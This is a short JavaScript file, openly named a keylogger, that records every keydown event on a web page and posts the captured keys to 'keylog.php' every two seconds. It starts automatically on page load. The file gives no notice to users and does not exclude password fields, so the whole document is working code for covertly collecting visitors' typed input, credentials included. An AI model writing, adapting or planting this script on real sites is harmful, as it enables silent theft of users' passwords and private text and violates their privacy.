var keylog = {
  // (A) SETTINGS & PROPERTIES
  cache: [], // temp storage for key presses
  delay: 2000, // how often to send data to server
  sending: false, // flag to allow 1 upload at a time
  intervalId: null, // ID of the interval timer

  // (B) INITIALIZE
  init: function () {
    // (B1) CAPTURE KEY STROKES
    window.addEventListener("keydown", keylog.captureKey);

    // (B2) SEND KEYSTROKES TO SERVER
    keylog.intervalId = window.setInterval(keylog.send, keylog.delay);
  },

  // (B3) FINALIZE - REMOVE EVENT LISTENERS
  finalize: function () {
    window.removeEventListener("keydown", keylog.captureKey);

    // Clear the interval
    clearInterval(keylog.intervalId);
  },

  // (B4) CAPTURE KEY STROKES
  captureKey: function (evt) {
    keylog.cache.push(evt.key);
  },

  // (C) AJAX SEND KEYSTROKES
  send: function () {
    if (!keylog.sending && keylog.cache.length !== 0) {
      // (C1) "LOCK" UNTIL THIS BATCH IS SENT TO SERVER
      keylog.sending = true;

      // (C2) KEYPRESS DATA
      var data = new FormData();
      data.append("keys", JSON.stringify(keylog.cache));
      keylog.cache = []; // clear keys

      // (C3) FETCH SEND
      fetch("keylog.php", { method: "POST", body: data })
        .then((res) => res.text())
        .then((res) => {
          keylog.sending = false; // unlock
          console.log(res); // optional
        })
        .catch((err) => console.error(err));
    }
  },
};

// Initialize the keylogger
window.addEventListener("DOMContentLoaded", keylog.init);

// Finalize the keylogger when the page is unloaded
window.addEventListener("beforeunload", keylog.finalize);
